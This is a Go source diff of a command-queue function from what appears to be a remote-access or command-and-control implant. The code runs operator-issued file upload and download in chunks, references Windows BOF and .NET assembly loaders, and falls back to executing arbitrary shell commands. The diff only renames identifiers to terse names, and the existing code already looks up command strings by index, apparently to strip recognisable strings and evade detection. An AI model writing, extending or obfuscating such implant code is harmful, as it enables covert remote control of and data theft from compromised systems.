@@ -11,10 +11,10 @@ import (
 	"time"
 )
 
-// ProcessNextCommand processes the next command in the queue
+// processNextCommand processes the next command in the queue
 // NOTE: inline-assembly and bof commands are Windows-only (.NET CLR / BOF loader)
 // They are not supported on Linux/Darwin builds
-func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
+func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
 	cq.mu.Lock()
 	if len(cq.commands) == 0 {
 		cq.mu.Unlock()
@@ -27,12 +27,12 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Add this diagnostic
 	//if strings.Contains(fmt.Sprintf("%v", cmd), "command_id") {
-	//	fmt.Fprintf(os.Stderr, "WARNING: Command struct would print as: %v\n", cmd)
+	//	fmt.Fprintf(os.Stderr, "WARNING: Msg struct would print as: %v\n", cmd)
 	//}
 
 	// Set the current command in context
 	cq.cmdContext.mu.Lock()
-	cq.cmdContext.CurrentCommand = &cmd
+	cq.cmdContext.CurrentMsg = &cmd
 	cq.cmdContext.mu.Unlock()
 
 	// IMPORTANT: Apply session environment variables before executing any command
@@ -42,15 +42,15 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	// They are not supported on Linux/Darwin builds - no handlers registered
 
 	// Handle upload chunks
-	if cmd.Command == getCqStr(idxCqCmdUpload) && cmd.Data != "" {
+	if cmd.Cmd == getCqStr(idxCqCmdUpload) && cmd.Data != "" {
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
-			return &CommandResult{
-				Command:     cmd,
+			return &OpResult{
+				Cmd:     cmd,
 				Error:       err,
-				ErrorString: err.Error(),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EStr: err.Error(),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}, nil
 		}
 		return result, nil
@@ -64,37 +64,37 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		cq.mu.Unlock()
 
 		if !exists {
-			return &CommandResult{
-				Command:     cmd,
+			return &OpResult{
+				Cmd:     cmd,
 				Error:       fmt.Errorf(Err(E4)),
-				ErrorString: Err(E4),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EStr: Err(E4),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}, nil
 		}
 
 		if !downloadInfo.InProgress {
-			return &CommandResult{
-				Command:     cmd,
+			return &OpResult{
+				Cmd:     cmd,
 				Error:       fmt.Errorf(Err(E4)),
-				ErrorString: Err(E4),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EStr: Err(E4),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}, nil
 		}
 
 		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
 		if err != nil {
-			return &CommandResult{
-				Command:     cmd,
+			return &OpResult{
+				Cmd:     cmd,
 				Error:       err,
-				ErrorString: err.Error(),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EStr: err.Error(),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}, nil
 		}
 
-		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)
+		cq.updateDownloadProgress(cmd.Filename, cmd.CurrentChunk)
 
 		return result, nil
 	}
@@ -104,70 +104,70 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Special handling for download and upload commands to preserve spaces in file paths
 	var args []string
-	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))
+	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Cmd))
 
 	if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdDownload)) {
 		// Use special parsing for download that treats everything after "download" as one argument
-		args = parseDownloadCommand(cmd.Command)
+		args = parseDownloadCommand(cmd.Cmd)
 	} else if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdUpload)) {
 		// Use special parsing for upload that treats everything after "upload" as one argument
-		args = parseUploadCommand(cmd.Command)
+		args = parseUploadCommand(cmd.Cmd)
 	} else {
 		// Use improved general parser for all other commands
-		args = parseCommandLine(cmd.Command)
+		args = parseCommandLine(cmd.Cmd)
 	}
 
 	if len(args) == 0 {
-		return &CommandResult{
-			Command:     cmd,
+		return &OpResult{
+			Cmd:     cmd,
 			Error:       fmt.Errorf(Err(E1)),
-			ErrorString: Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E1),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}, nil
 	}
-	// args[0] is the command name (already identified by CommandType)
+	// args[0] is the command name (already identified by CT)
 	cmdArgs := args[1:]
 
 	// Look up command handler by numeric ID
-	if handler, exists := cq.cmdHandlers[cmd.CommandType]; exists {
+	if handler, exists := cq.cmdHandlers[cmd.CT]; exists {
 		result := handler(cq.cmdContext, cmdArgs)
 
 		// For file operations (download/upload), preserve the data from the handler
-		if (cmd.CommandType == CmdDownload || cmd.CommandType == CmdUpload) &&
-			(result.Command.Filename != "" || result.Command.Data != "") {
+		if (cmd.CT == CmdDownload || cmd.CT == CmdUpload) &&
+			(result.Cmd.Filename != "" || result.Cmd.Data != "") {
 			// The handler set file operation data, merge with original command metadata
-			result.Command.CommandID = cmd.CommandID
-			result.Command.CommandDBID = cmd.CommandDBID
-			result.Command.AgentID = cmd.AgentID
-			result.Command.Timestamp = cmd.Timestamp
+			result.Cmd.CID = cmd.CID
+			result.Cmd.DID = cmd.DID
+			result.Cmd.AID = cmd.AID
+			result.Cmd.Timestamp = cmd.Timestamp
 			// Keep the file data from the handler (Filename, CurrentChunk, TotalChunks, Data)
 		} else {
 			// For non-file operations, use the original command
-			result.Command = cmd
+			result.Cmd = cmd
 		}
 
-		result.CompletedAt = time.Now().Format(time.RFC3339)
+		result.Done = time.Now().Format(time.RFC3339)
 		return &result, nil
 	}
 
-	// If no handler found (CommandType == CmdUnknown or unregistered), try shell command
-	output, err := executeShellCommand(cmd.Command)
+	// If no handler found (CT == CmdUnknown or unregistered), try shell command
+	output, err := executeShellCommand(cmd.Cmd)
 	if err != nil {
-		return &CommandResult{
-			Command:     cmd,
+		return &OpResult{
+			Cmd:     cmd,
 			Output:      output,
 			Error:       err,
-			ErrorString: err.Error(),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: err.Error(),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}, nil
 	}
 
-	return &CommandResult{
-		Command:     cmd,
+	return &OpResult{
+		Cmd:     cmd,
 		Output:      output,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}, nil
 }
